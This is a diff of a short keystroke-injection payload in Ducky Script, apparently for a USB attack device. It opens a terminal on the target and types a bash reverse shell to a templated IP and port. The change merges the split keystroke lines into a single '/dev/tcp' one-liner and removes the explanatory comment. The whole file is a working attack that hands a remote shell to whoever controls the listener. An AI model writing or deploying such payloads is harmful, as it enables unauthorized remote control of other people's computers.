@@ -1,11 +1,5 @@
-REM Creates a reverse shell using Bash
-DELAY {start_delay}
+DELAY {START_DELAY}
 CTRL-ALT t
-DELAY 400
-STRING bash -i >& /dev/tcp/
-STRING #IP
-STRING /
-STRING #PORT
-SPACE
-STRING 0>&1 &! exit
+DELAY {TERMINAL_DELAY}
+STRING bash -i >& /dev/tcp/{IP}/{PORT} 0>&1 &! exit
 ENTER
